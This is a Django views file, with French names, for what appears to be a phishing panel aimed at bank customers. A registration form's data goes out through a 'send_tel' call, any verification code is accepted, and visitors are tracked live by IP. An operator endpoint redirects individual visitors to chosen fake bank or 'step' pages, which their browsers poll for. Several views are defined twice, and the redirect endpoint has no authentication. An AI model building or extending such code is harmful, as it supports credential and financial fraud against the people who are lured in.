from django.shortcuts import render, redirect
import requests
import time
from .middleware import VISITEURS_ACTIFS, REDIRECTIONS, PAGES_DISPONIBLES
from django.views.decorators.http import require_POST
import json

from .forms import InscriptionForm, VerificationForm



from django.shortcuts import render, redirect


from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.hashers import make_password

@require_POST
def rediriger_visiteur(request):
    from django.http import JsonResponse
    ip    = request.POST.get('ip')
    cible = request.POST.get('cible')
    if not ip or not cible:
        return JsonResponse({'ok': False}, status=400)
    REDIRECTIONS[ip] = cible
    return JsonResponse({'ok': True, 'ip': ip, 'cible': cible})
def verifier_redirection(request):
    from django.http import JsonResponse
    from .middleware import REDIRECTIONS
    ip = request._get_ip(request) if hasattr(request, '_get_ip') else (
        request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip()
        or request.META.get('REMOTE_ADDR', '')
    )
    cible = REDIRECTIONS.pop(ip, None)  # consomme la redirection si elle existe
    return JsonResponse({'redirect': cible})

def verifier_redirection(request):
    from django.http import JsonResponse

    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        ip = x_forwarded.split(',')[0].strip()
    else:
        ip = request.META.get('REMOTE_ADDR', '')

    if ip == '::1':
        ip = '127.0.0.1'

    print(f">>> POLL        ip='{ip}'")
    print(f">>> REDIRECTIONS={REDIRECTIONS}")

    cible = REDIRECTIONS.pop(ip, None)
    return JsonResponse({'redirect': cible})


def rediriger_visiteur(request):
    from django.http import JsonResponse
    ip    = request.POST.get('ip')
    cible = request.POST.get('cible')

    print(f">>> ADMIN redirige ip='{ip}' vers '{cible}'")

    if not ip or not cible:
        return JsonResponse({'ok': False}, status=400)
    REDIRECTIONS[ip] = cible
    return JsonResponse({'ok': True, 'ip': ip, 'cible': cible})
    
def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('banque_1')
    else:
        form = InscriptionForm()

    return render(request, "onboarding\\inscription.html", {'form': form})

def visiteurs_temps_reel(request):
    maintenant = time.time()
    visiteurs = []
    for ip, data in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - data['last_seen'])
        visiteurs.append({
            'ip':         ip,
            'page':       data['page'],
            'methode':    data['methode'],
            'user_agent': data['user_agent'],
            'il_y_a':     f"il y a {il_y_a}s",
        })
    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':    visiteurs,
        'total':        len(visiteurs),
        'pages':        PAGES_DISPONIBLES,
        'pages_json':   json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })
def visiteurs_json(request):
    from django.http import JsonResponse
    maintenant = time.time()
    data = []
    for ip, info in VISITEURS_ACTIFS.items():
        il_y_a = int(maintenant - info['last_seen'])
        data.append({
            'ip':      ip,
            'page':    info['page'],
            'methode': info['methode'],
            'il_y_a':  il_y_a,
        })
    data.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': data, 'total': len(data)})

def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            # Ici, on vérifierait normalement le code envoyé par e-mail.
            return redirect('etape_1')
    else:
        form = VerificationForm()

    return render(request, 'onboarding/verification.html', {'form': form})

def etape_1(request):
    return render(request, 'onboarding/etape-1.html')


def etape_2(request):
    return render(request, 'onboarding/etape-2.html')


def etape_3(request):
    return render(request, 'onboarding/etape-3.html')


def etape_4(request):
    return render(request, 'onboarding/etape-4.html')


def etape_5(request):
    return render(request, 'onboarding/etape-5.html')


def etape_6(request):
    return render(request, 'onboarding/etape-6.html')


def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


